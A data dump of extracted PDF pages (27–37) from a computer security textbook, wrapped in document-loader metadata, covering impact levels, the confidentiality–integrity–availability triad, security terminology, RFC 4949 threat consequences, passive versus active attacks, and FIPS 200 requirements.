       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 28, 'page_label': '27'}, page_content='1.1 / COMPUTER SECURiTY CONCEPTS  27\\n• Moderate: The loss could be expected to have a serious adverse effect on \\n organizational oper ations, organizational assets, or individuals. A serious \\nadverse effect means that, for example, the loss might: (i) cause a significant \\ndegradation in mission capability to an extent and duration that the organiza-\\ntion is able to perform its primary functions, but the effectiveness of the func-\\ntions is significantly reduced; (ii) result in significant damage to organizational \\nassets; (iii)\\xa0result in significant financial loss; or (iv) result in significant harm to \\nindividuals that does not involve loss of life or serious life-threatening injuries.\\n• High: The loss could be expected to have a severe or catastrophic adverse effect \\non organizational operations, organizational assets, or individuals. A severe or \\ncatastrophic adverse effect means that, for example, the loss might: (i) cause a \\nsevere degradation in or loss of mission capability to an extent and duration \\nthat the organization is not able to perform one or more of its primary func -\\ntions; (ii) result in major damage to organizational assets; (iii) result in major \\nfinancial loss; or (iv) result in severe or catastrophic harm to individuals involv-\\ning loss of life or serious life-threatening injuries.\\nConfidentiality Student grade information is an asset whose confidentiality is  \\nconsidered to be highly important by students. In the United States, the release of \\nsuch information is regulated by the Family Educational Rights and Privacy Act \\n(FERPA). Grade information should only be available to students, their parents, and \\nemployees that require the information to do their job. Student enrollment informa-\\ntion may have a moderate confidentiality rating. While still covered by FERPA, this \\ninformation is seen by more people on a daily basis, is less likely to be targeted than \\ngrade information, and results in less damage if disclosed. Directory information, such \\nas lists of students or faculty or departmental lists, may be assigned a low confiden -\\ntiality rating or indeed no rating. This information is typically freely available to the \\npublic and published on a school’s website.\\nintegrity Several aspects of integrity are illustrated by the example of a hospital \\npatient’s allergy information stored in a database. The doctor should be able to trust \\nthat the information is correct and current. Now, suppose an employee (e.g., a nurse) \\nwho is authorized to view and update this information deliberately falsifies the data \\nto cause harm to the hospital. The database needs to be restored to a trusted basis \\nquickly, and it should be possible to trace the error back to the person responsible. \\nPatient allergy information is an example of an asset with a high requirement for \\nintegrity. Inaccurate information could result in serious harm or death to a patient, \\nand expose the hospital to massive liability.\\nAn example of an asset that may be assigned a moderate level of integrity \\nrequirement is a website that offers a forum to registered users to discuss some spe-\\ncific topic. Either a registered user or a hacker could falsify some entries or deface the \\nwebsite. If the forum exists only for the enjoyment of the users, brings in little or no \\nadvertising revenue, and is not used for something important such as research, then \\npotential damage is not severe. The Webmaster may experience some data, financial, \\nand time loss.\\nAn example of a low integrity requirement is an anonymous online poll. Many \\nwebsites, such as news organizations, offer these polls to their users with very few \\nM01_STAL0611_04_GE_C01.indd   27 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 29, 'page_label': '28'}, page_content='28  CHAPTER 1 / OvERviEw\\nsafeguards. However, the inaccuracy and unscientific nature of such polls is well \\nunderstood.\\navailability The more critical a component or service is, the higher will be the \\nlevel of availability required. Consider a system that provides authentication services \\nfor critical systems, applications, and devices. An interruption of service results in the \\ninability for customers to access computing resources and staff to access the resources \\nthey need to perform critical tasks. The loss of the service translates into a large \\n financial loss in lost employee productivity and potential customer loss.\\nAn example of an asset that would typically be rated as having a moderate \\navailability requirement is a public website for a university; the website provides \\ninformation for current and prospective students and donors. Such a site is not a \\ncritical component of the university’s information system, but its unavailability will \\ncause some embarrassment.\\nAn online telephone directory lookup application would be classified as a low \\navailability requirement. Although the temporary loss of the application may be an \\nannoyance, there are other ways to access the information, such as a hardcopy direc-\\ntory or the operator.\\nThe Challenges of Computer Security\\nComputer security is both fascinating and complex. Some of the reasons are as follows:\\n1. Computer security is not as simple as it might first appear to the novice.  The \\nrequirements seem to be straightforward; indeed, most of the major require -\\nments for security services can be given self-explanatory one-word labels: \\n confidentiality, authentication, nonrepudiation, and integrity. But the mecha -\\nnisms used to meet those requirements can be quite complex, and  understanding \\nthem may involve rather subtle reasoning.\\n2. In developing a particular security mechanism or algorithm, one must always con-\\nsider potential attacks on those security features. In many cases, successful attacks \\nare designed by looking at the problem in a completely different way, therefore \\nexploiting an unexpected weakness in the mechanism.\\n3. Because of Point 2, the procedures used to provide particular services are often \\ncounterintuitive. Typically, a security mechanism is complex, and it is not obvious \\nfrom the statement of a particular requirement that such elaborate measures are \\nneeded. Only when the various aspects of the threat are considered do elaborate \\nsecurity mechanisms make sense.\\n4. Having designed various security mechanisms, it is necessary to decide where to \\nuse them. This is true both in terms of physical placement (e.g., at what points in \\na network are certain security mechanisms needed) and in a logical sense [e.g., \\nat what layer or layers of an architecture such as TCP/IP (Transmission Control \\nProtocol/Internet Protocol) should mechanisms be placed].\\n5. Security mechanisms typically involve mor e than a particular algorithm or \\n protocol. They also require that participants be in possession of some secret \\ninformation (e.g., an encryption key), which raises questions about the creation, \\ndistribution, and protection of that secret information. There may also be a reli-\\nance on communications protocols whose behavior may complicate the task of \\nM01_STAL0611_04_GE_C01.indd   28 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 30, 'page_label': '29'}, page_content='1.1 / COMPUTER SECURiTY CONCEPTS  29\\ndeveloping the security mechanism. For example, if the proper functioning of the \\nsecurity mechanism requires setting time limits on the transit time of a message \\nfrom sender to receiver, then any protocol or network that introduces variable, \\nunpredictable delays may render such time limits meaningless.\\n6. Computer security is essentially a battle of wits between a perpetrator who tries \\nto find holes, and the designer or administrator who tries to close them. The great \\nadvantage that the attacker has is that he or she need only find a single weak-\\nness, while the designer must find and eliminate all weaknesses to achieve perfect \\nsecurity.\\n7. There is a natural tendency on the part of users and system managers to perceive \\nlittle benefit from security investment until a security failure occurs.\\n8. Security requires regular, even constant monitoring, and this is difficult in today’s \\nshort-term, overloaded environment.\\n9. Security is still too often an afterthought to be incorporated into a system after \\nthe design is complete, rather than being an integral part of the design process.\\n10. Many users and even security administrators view strong security as an impedi-\\nment to efficient and user-friendly operation of an information system or use \\nof information.\\nThe difficulties just enumerated will be encountered in numerous ways as we \\nexamine the various security threats and mechanisms throughout this book.\\nA Model for Computer Security\\nWe now introduce some terminology that will be useful throughout the book.3  Table \\n1.1 defines terms and Figure 1.2, based on [CCPS12a], shows the relationship among \\nsome of these terms. We start with the concept of a system resource or asset, that \\nusers and owners wish to protect. The assets of a computer system can be categorized \\nas follows:\\n• Hardware: Including computer systems and other data processing, data storage, \\nand data communications devices.\\n• Software: Including the operating system, system utilities, and applications.\\n• Data: Including files and databases, as well as security-related data, such as \\npassword files.\\n• Communication facilities and netw orks: Local and wide area network com -\\nmunication links, bridges, routers, and so on.\\nIn the context of security, our concern is with the vulnerabilities  of system \\nresources. [NRC02] lists the following general categories of vulnerabilities of a com-\\nputer system or network asset:\\n• The system can be corrupted, so it does the wrong thing or gives wrong answers. \\nFor example, stored data values may differ from what they should be because \\nthey have been improperly modified.\\n3See Chapter 0 for an explanation of RFCs.\\nM01_STAL0611_04_GE_C01.indd   29 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 31, 'page_label': '30'}, page_content='30  CHAPTER 1 / OvERviEw\\nFigure 1.2 Security Concepts and Relationships\\nAssets\\nThreats\\nThreat agents\\nWish to \\nminimize\\nWish to abuse\\nand/or\\nmay damage\\nToTo\\nThat\\nincrease\\nGive\\nrise to\\nOwners\\nCountermeasures\\nRisk\\nImpose\\nValue\\nTo\\nreduce\\nAdversary (threat agent)\\nIndividual, group, organization, or government that conducts or has the intent to conduct detrimental activities.\\nAttack\\nAny kind of malicious activity that attempts to collect, disrupt, deny, degrade, or destroy information system \\nresources or the information itself.\\nCountermeasure\\nA device or techniques that has as its objective the impairment of the operational effectiveness of  undesirable \\nor adversarial activity, or the prevention of espionage, sabotage, theft, or unauthorized access to or use of \\n sensitive information or information systems.\\nRisk\\nA measure of the extent to which an entity is threatened by a potential circumstance or event, and typically a function \\nof 1) the adverse impacts that would arise if the circumstance or event occurs; and 2) the likelihood of occurrence.\\nSecurity Policy\\nA set of criteria for the provision of security services. It defines and constrains the activities of a data process-\\ning facility in order to maintain a condition of security for systems and data.\\nSystem Resource (Asset)\\nA major application, general support system, high impact program, physical plant, mission critical system, per-\\nsonnel, equipment, or a logically related group of systems.\\nThreat\\nAny circumstance or event with the potential to adversely impact organizational operations (including mission, func-\\ntions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an informa-\\ntion system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service.\\nVulnerability\\nWeakness in an information system, system security procedures, internal controls, or implementation that \\ncould be exploited or triggered by a threat source.\\nSource: Stallings, William, Computer Security: Principles and Practice, 4e., ©2019. Reprinted and electronically \\nreproduced by permission of pearson education, inc., new york, ny.\\nTable 1.1 Computer Security Terminology\\n• The system can become leaky. For example, someone who should not have \\naccess to some or all of the information available through the network obtains \\nsuch access.\\n• The system can become unavailable or very slow. That is, using the system or \\nnetwork becomes impossible or impractical.\\nM01_STAL0611_04_GE_C01.indd   30 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 32, 'page_label': '31'}, page_content='1.2 / THREATS, ATTACKS, AND ASSETS  31\\nThese three general types of vulnerability correspond to the concepts of integrity, \\nconfidentiality, and availability, enumerated earlier in this section.\\nCorresponding to the various types of vulnerabilities to a system resource are \\nthreats that are capable of exploiting those vulnerabilities. A threat represents a \\npotential security harm to an asset. An attack is a threat that is carried out (threat \\naction) and, if successful, leads to an undesirable violation of security, or threat con-\\nsequence. The agent carrying out the attack is referred to as an attacker or threat \\nagent. We can distinguish two types of attacks:\\n• Active attack: An attempt to alter system resources or affect their operation.\\n• Passive attack: An attempt to learn or make use of information from the system \\nthat does not affect system resources.\\nWe can also classify attacks based on the origin of the attack:\\n• Inside attack: Initiated by an entity inside the security perimeter (an “insider”). \\nThe insider is authorized to access system resources but uses them in a way not \\napproved by those who granted the authorization.\\n• Outside attack: Initiated from outside the perimeter, by an unauthorized or ille-\\ngitimate user of the system (an “outsider”). On the Internet, potential outside \\nattackers range from amateur pranksters to organized criminals, international \\nterrorists, and hostile governments.\\nFinally, a countermeasure is any means taken to deal with a security attack. \\nIdeally, a countermeasure can be devised to prevent a particular type of attack from \\nsucceeding. When prevention is not possible, or fails in some instance, the goal is to \\ndetect the attack then recover from the effects of the attack. A countermeasure may \\nitself introduce new vulnerabilities. In any case, residual vulnerabilities may remain \\nafter the imposition of countermeasures. Such vulnerabilities may be exploited by \\nthreat agents representing a residual level of risk to the assets. Owners will seek to \\nminimize that risk given other constraints.\\n 1.2 THREATS, ATTACKS, AND ASSETS\\nWe now turn to a more detailed look at threats, attacks, and assets. First, we look at \\nthe types of security threats that must be dealt with, and then give some examples of \\nthe types of threats that apply to different categories of assets.\\nThreats and Attacks\\nTable 1.2, based on RFC 4949, describes four kinds of threat consequences and lists \\nthe kinds of attacks that result in each consequence.\\nUnauthorized disclosure is a threat to confidentiality. The following types of \\nattacks can result in this threat consequence:\\n• Exposure: This can be deliberate, as when an insider intentionally releases sen-\\nsitive information, such as credit card numbers, to an outsider. It can also be \\nthe result of a human, hardware, or software error, which results in an entity \\ngaining unauthorized knowledge of sensitive data. There have been numerous \\nM01_STAL0611_04_GE_C01.indd   31 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 33, 'page_label': '32'}, page_content='32  CHAPTER 1 / OvERviEw\\nThreat Consequence Threat Action (Attack)\\nUnauthorized Disclosure\\nA circumstance or event whereby \\nan entity gains access to data for \\nwhich the entity is not authorized.\\nExposure: Sensitive data are directly released to an unauthorized \\nentity.\\nInterception: An unauthorized entity directly accesses sensitive \\ndata traveling between authorized sources and destinations.\\nInference: A threat action whereby an unauthorized entity \\n indirectly accesses sensitive data (but not necessarily the \\ndata contained in the communication) by reasoning from \\n characteristics or by-products of communications.\\nIntrusion: An unauthorized entity gains access to sensitive data \\nby circumventing a system’s security protections.\\nDeception\\nA circumstance or event that \\nmay result in an authorized entity \\nreceiving false data and believing it \\nto be true.\\nMasquerade: An unauthorized entity gains access to a system or \\nperforms a malicious act by posing as an authorized entity.\\nFalsification: False data deceive an authorized entity.\\nRepudiation: An entity deceives another by falsely denying \\nresponsibility for an act.\\nDisruption\\nA circumstance or event that \\ninterrupts or prevents the correct \\noperation of system services and \\nfunctions.\\nIncapacitation: Prevents or interrupts system operation by \\n disabling a system component.\\nCorruption: Undesirably alters system operation by adversely \\nmodifying system functions or data.\\nObstruction: A threat action that interrupts delivery of system \\nservices by hindering system operation.\\nUsurpation\\nA circumstance or event that results \\nin control of system services or \\nfunctions by an unauthorized entity.\\nMisappropriation: An entity assumes unauthorized logical or \\nphysical control of a system resource.\\nMisuse: Causes a system component to perform a function or \\n service that is detrimental to system security.\\nSource: Based on RFC 4949\\nTable 1.2 Threat Consequences, and the Types of Threat Actions that Cause Each Consequence\\ninstances of this, such as universities accidentally posting confidential student \\ninformation on the Web.\\n• Interception: Interception is a common attack in the context of communica -\\ntions. On a shared local area network (LAN), such as a wireless LAN or a \\nbroadcast Ethernet, any device attached to the LAN can receive a copy of \\npackets intended for another device. On the Internet, a determined hacker can \\ngain access to e-mail traffic and other data transfers. All of these situations cre-\\nate the potential for unauthorized access to data.\\n• Inference: An example of inference is known as traffic analysis, in which an \\nadversary is able to gain information from observing the pattern of traffic on \\na network, such as the amount of traffic between particular pairs of hosts on \\nthe network. Another example is the inference of detailed information from a \\ndatabase by a user who has only limited access; this is accomplished by repeated \\nqueries whose combined results enable inference.\\n• Intrusion: An example of intrusion is an adversary gaining unauthorized access \\nto sensitive data by overcoming the system’s access control protections.\\nM01_STAL0611_04_GE_C01.indd   32 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 34, 'page_label': '33'}, page_content='1.2 / THREATS, ATTACKS, AND ASSETS  33\\nDeception is a threat to either system integrity or data integrity. The following \\ntypes of attacks can result in this threat consequence:\\n• Masquerade: One example of masquerade is an attempt by an unauthorized \\nuser to gain access to a system by posing as an authorized user; this could hap-\\npen if the unauthorized user has learned another user’s logon ID and password. \\nAnother example is malicious logic, such as a Trojan horse, that appears to \\nperform a useful or desirable function but actually gains unauthorized access \\nto system resources, or tricks a user into executing other malicious logic.\\n• Falsification: This refers to the altering or replacing of valid data or the intro -\\nduction of false data into a file or database. For example, a student may alter \\nhis or her grades on a school database.\\n• Repudiation: In this case, a user either denies sending data, or a user denies \\nreceiving or possessing the data.\\nDisruption is a threat to availability or system integrity. The following types of \\nattacks can result in this threat consequence:\\n• Incapacitation: This is an attack on system availability. This could occur as a \\nresult of physical destruction of or damage to system hardware. More typically, \\nmalicious software, such as Trojan horses, viruses, or worms, could operate in \\nsuch a way as to disable a system or some of its services.\\n• Corruption: This is an attack on system integrity. Malicious software in this \\ncontext could operate in such a way that system resources or services function \\nin an unintended manner. Or a user could gain unauthorized access to a system \\nand modify some of its functions. An example of the latter is a user placing \\nbackdoor logic in the system to provide subsequent access to a system and its \\nresources by other than the usual procedure.\\n• Obstruction: One way to obstruct system operation is to interfere with commu-\\nnications by disabling communication links or altering communication control \\ninformation. Another way is to overload the system by placing excess burden \\non communication traffic or processing resources.\\nUsurpation is a threat to system integrity. The following types of attacks can \\nresult in this threat consequence:\\n• Misappropriation: This can include theft of service. An example is a distributed \\ndenial of service attack, when malicious software is installed on a number of hosts \\nto be used as platforms to launch traffic at a target host. In this case, the malicious \\nsoftware makes unauthorized use of processor and operating system resources.\\n• Misuse: Misuse can occur by means of either malicious logic or a hack er that \\nhas gained unauthorized access to a system. In either case, security functions \\ncan be disabled or thwarted.\\nThreats and Assets\\nThe assets of a computer system can be categorized as hardware, software, data, and \\ncommunication lines and networks. In this subsection, we briefly describe these four \\nM01_STAL0611_04_GE_C01.indd   33 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 35, 'page_label': '34'}, page_content='34  CHAPTER 1 / OvERviEw\\ncategories and relate these to the concepts of integrity, confidentiality, and availability \\nintroduced in Section 1.1 (see Figure 1.3 and Table 1.3).\\nHardware A major threat to computer system hardware is the threat to availabil-\\nity. Hardware is the most vulnerable to attack and the least susceptible to automated \\ncontrols. Threats include accidental and deliberate damage to equipment as well as \\ntheft. The proliferation of personal computers and workstations and the widespread \\nuse of LANs increase the potential for losses in this area. Theft of USB drives can \\nlead to loss of confidentiality. Physical and administrative security measures are \\nneeded to deal with these threats.\\nSoftware Software includes the operating system, utilities, and application pro -\\ngrams. A key threat to software is an attack on availability. Software, especially \\napplication software, is often easy to delete. Software can also be altered or damaged \\nto render it useless. Careful software configuration management, which includes \\nmaking backups of the most recent version of software, can maintain high avail -\\nability. A more difficult problem to deal with is software modification that results \\nin a program that still functions but that behaves differently than before, which is a \\nthreat to integrity/authenticity. Computer viruses and related attacks fall into this \\ncategory. A final problem is protection against software piracy. Although certain \\nFigure 1.3 Scope of Computer Security\\nNote: This figure depicts security concerns other than physical security, including controlling of \\naccess to computers systems, safeguarding of data transmitted over communications systems, and \\n safeguarding of stored data.\\nData\\nSensitive ﬁles\\nmust be secure\\n(ﬁle security)\\nProcesses representing users\\nUsers making requests\\nGuard\\nAccess to the data\\nmust be controlled\\n(protection)\\nComputer system\\nData\\nProcesses representing users\\nGuard\\n    Data must be\\nsecurely transmitted\\nthrough networks\\n(network security)\\nComputer system\\n3\\n4\\n   Access to the computer\\nfacility must be controlled\\n(user authentication)\\n2\\n1\\nM01_STAL0611_04_GE_C01.indd   34 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 36, 'page_label': '35'}, page_content='1.2 / THREATS, ATTACKS, AND ASSETS  35\\ncountermeasures are available, by and large the problem of unauthorized copying \\nof software has not been solved.\\ndata Hardware and software security are typically concerns of computing cen -\\nter professionals or individual concerns of personal computer users. A much more \\nwidespread problem is data security, which involves files and other forms of data \\ncontrolled by individuals, groups, and business organizations.\\nSecurity concerns with respect to data are broad, encompassing availability, \\nsecrecy, and integrity. In the case of availability, the concern is with the destruction \\nof data files, which can occur either accidentally or maliciously.\\nThe obvious concern with secrecy is the unauthorized reading of data files or \\ndatabases, and this area has been the subject of perhaps more research and effort \\nthan any other area of computer security. A less obvious threat to secrecy involves the \\nanalysis of data and manifests itself in the use of so-called statistical databases, which \\nprovide summary or aggregate information. Presumably, the existence of aggregate \\ninformation does not threaten the privacy of the individuals involved. However, as \\nthe use of statistical databases grows, there is an increasing potential for disclosure \\nof personal information. In essence, characteristics of constituent individuals may be \\nidentified through careful analysis. For example, if one table records the aggregate of \\nthe incomes of respondents A, B, C, and D and another records the aggregate of the \\nincomes of A, B, C, D, and E, the difference between the two aggregates would be the \\nincome of E. This problem is exacerbated by the increasing desire to combine data \\nsets. In many cases, matching several sets of data for consistency at different levels \\nof aggregation requires access to individual units. Thus, the individual units, which \\nare the subject of privacy concerns, are available at various stages in the processing \\nof data sets.\\nFinally, data integrity is a major concern in most installations. Modifications to \\ndata files can have consequences ranging from minor to disastrous.\\nAvailability Confidentiality Integrity\\nHardware Equipment is stolen or \\n disabled, thus denying \\nservice.\\nAn unencrypted  \\nUSB drive is stolen.\\nSoftware Programs are deleted, \\n denying access to users.\\nAn unauthorized copy of \\nsoftware is made.\\nA working program is modi-\\nfied, either to cause it to fail \\nduring execution or to cause \\nit\\xa0to do some unintended task.\\nData Files are deleted, denying \\naccess to users.\\nAn unauthorized read \\nof data is performed. An \\nanalysis of statistical data \\nreveals underlying data.\\nExisting files are modified or \\nnew files are fabricated.\\n Communication \\nLines and \\nNetworks\\nMessages are destroyed or \\ndeleted.  Communication \\nlines or networks are \\n rendered unavailable.\\nMessages are read. The \\ntraffic pattern of  messages \\nis observed.\\nMessages are modified, \\ndelayed, reordered, or dupli-\\ncated. False messages are \\nfabricated.\\nTable 1.3 Computer and Network Assets, with Examples of Threats\\nM01_STAL0611_04_GE_C01.indd   35 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 37, 'page_label': '36'}, page_content='36  CHAPTER 1 / OvERviEw\\nCommuniCation lineS and networkS Network security attacks can be classified \\nas passive attacks and active attacks. A passive attack attempts to learn or make use of \\ninformation from the system, but does not affect system resources. An active attack \\nattempts to alter system resources or affect their operation.\\nPassive attacks are in the nature of eavesdropping on, or monitoring of, trans-\\nmissions. The goal of the attacker is to obtain information that is being transmit -\\nted. Two types of passive attacks are the release of message contents and traffic \\nanalysis.\\nThe release of message contents is easily understood. A telephone conversation, \\nan electronic mail message, and a transferred file may contain sensitive or confiden-\\ntial information. We would like to prevent an opponent from learning the contents \\nof these transmissions.\\nA second type of passive attack, traffic analysis , is more subtle. Suppose we \\nhad a way of masking the contents of messages or other information traffic so oppo-\\nnents, even if they captured the message, could not extract the information from \\nthe  message. The common technique for masking contents is encryption. If we had \\nencryption protection in place, an opponent might still be able to observe the  pattern \\nof these messages. The opponent could determine the location and identity of com-\\nmunicating hosts and could observe the frequency and length of messages being \\nexchanged. This information might be useful in guessing the nature of the communi-\\ncation that was taking place.\\nPassive attacks are very difficult to detect because they do not involve any \\nalteration of the data. Typically, the message traffic is sent and received in an appar-\\nently normal fashion and neither the sender nor receiver is aware that a third party \\nhas read the messages or observed the traffic pattern. However, it is feasible to pre-\\nvent the success of these attacks, usually by means of encryption. Thus, the emphasis \\nin dealing with passive attacks is on prevention rather than detection.\\nActive attacks involve some modification of the data stream or the creation \\nof a false stream, and can be subdivided into four categories: replay, masquerade, \\nmodification of messages, and denial of service.\\nReplay involves the passive capture of a data unit and its subsequent retrans -\\nmission to produce an unauthorized effect.\\nA masquerade takes place when one entity pretends to be a different entity. \\nA masquerade attack usually includes one of the other forms of active attack. For \\nexample, authentication sequences can be captured and replayed after a valid \\nauthentication sequence has taken place, thus enabling an authorized entity with \\nfew privileges to obtain extra privileges by impersonating an entity that has those \\nprivileges.\\nModification of messages  simply means that some portion of a legitimate \\nmessage is altered, or that messages are delayed or reordered, to produce an unau -\\nthorized effect. For example, a message stating, “Allow John Smith to read confi -\\ndential file accounts” is modified to say, “Allow Fred Brown to read confidential \\nfile accounts.”\\nThe denial of service  prevents or inhibits the normal use or management of \\ncommunication facilities. This attack may have a specific target; for example, an \\nentity may suppress all messages directed to a particular destination (e.g., the security \\nM01_STAL0611_04_GE_C01.indd   36 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 38, 'page_label': '37'}, page_content='1.3 / SECURiTY FUNCTiONAL REQUiREMENTS  37\\naudit service). Another form of service denial is the disruption of an entire network, \\neither by disabling the network or by overloading it with messages so as to degrade \\nperformance.\\nActive attacks present the opposite characteristics of passive attacks. Whereas \\npassive attacks are difficult to detect, measures are available to prevent their success. \\nOn the other hand, it is quite difficult to prevent active attacks absolutely, because \\nto do so would require physical protection of all communication facilities and paths \\nat all times. Instead, the goal is to detect them and to recover from any disruption \\nor delays caused by them. Because the detection has a deterrent effect, it may also \\ncontribute to prevention.\\n 1.3 SECURITY FUNCTIONAL REQUIREMENTS\\nThere are a number of ways of classifying and characterizing the countermeasures \\nthat may be used to reduce vulnerabilities and deal with threats to system assets. In \\nthis section, we view countermeasures in terms of functional requirements, and we \\nfollow the classification defined in FIPS 200 ( Minimum Security Requirements for \\nFederal Information and Information Systems). This standard enumerates 17 security-\\nrelated areas with regard to protecting the confidentiality, integrity, and availability of \\ninformation systems and the information processed, stored, and transmitted by those \\nsystems. The areas are defined in Table 1.4.\\nThe requirements listed in FIPS 200 encompass a wide range of counter -\\nmeasures to security vulnerabilities and threats. Roughly, we can divide these \\n countermeasures into two categories: those that require computer security technical \\nmeasures (covered in Parts One and Two), either hardware or software, or both; and \\nthose that are fundamentally management issues (covered in Part Three).\\nEach of the functional areas may involve both computer security technical mea-\\nsures and management measures. Functional areas that primarily require computer \\nsecurity technical measures include access control, identification and authentica -\\ntion, system and communication protection, and system and information integrity. \\nFunctional areas that primarily involve management controls and procedures include \\nawareness and training; audit and accountability; certification, accreditation, and \\nsecurity assessments; contingency planning; maintenance; physical and environmen-\\ntal protection; planning; personnel security; risk assessment; and systems and services \\nacquisition. Functional areas that overlap computer security technical measures and \\nmanagement controls include configuration management, incident response, and \\nmedia protection.\\nNote the majority of the functional requirements areas in FIPS 200 are either \\nprimarily issues of management or at least have a significant management com -\\nponent, as opposed to purely software or hardware solutions. This may be new to \\nsome readers, and is not reflected in many of the books on computer and informa -\\ntion security. But as one computer security expert observed, “If you think tech -\\nnology can solve your security problems, then you don’t understand the problems \\nand you don’t understand the technology” [SCHN00]. This book reflects the need \\nM01_STAL0611_04_GE_C01.indd   37 10/10/17   9:22 PM'),\n",
